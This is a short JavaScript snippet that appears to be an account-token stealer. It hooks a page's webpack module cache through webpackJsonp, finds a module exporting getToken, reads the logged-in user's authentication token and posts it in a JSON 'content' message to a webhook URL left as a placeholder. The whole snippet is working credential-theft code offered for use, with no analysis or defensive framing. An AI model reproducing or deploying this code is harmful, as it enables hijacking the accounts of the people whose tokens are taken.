var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function () {
  if (this.readyState === this.DONE) {
    console.log(this.responseText);
  }
});

var req=webpackJsonp.push([[], {extra_id:(e,r,t) => e.exports=t},[["extra_id"]]]);
for(let e in req.c) {
  if(req.c.hasOwnProperty(e)){
    let r=req.c[e].exports;if(r&&r.__esModule&&r.default) for(let e in r.default) if ("getToken"===e) {
      var token = r.default.getToken()
    }
  }
}

async function postData(url = '', data = {}) {
  console.log(JSON.stringify(data));
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    referrerPolicy: 'no-referrer',
    body: JSON.stringify(data)
  });
  return response.json();
}

// console.log(token)

postData('Webhook', { content: "Token : " + token + "" })
